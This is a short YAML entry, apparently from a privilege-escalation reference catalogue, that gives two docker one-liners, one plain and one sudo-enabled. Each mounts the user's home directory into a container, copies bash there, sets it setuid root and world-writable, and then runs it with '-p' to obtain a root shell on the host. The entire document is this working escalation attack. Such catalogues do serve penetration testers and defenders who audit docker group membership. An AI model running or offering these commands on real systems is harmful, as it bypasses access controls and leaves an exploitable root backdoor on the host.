---
functions:
  execute-interactive:
    - code: docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p
  sudo-enabled:
    - code: sudo docker run -v /home/${USER}:/h_docs ubuntu bash -c "cp /bin/bash /h_docs/rootshell && chmod 4777 /h_docs/rootshell;" && ~/rootshell -p
---
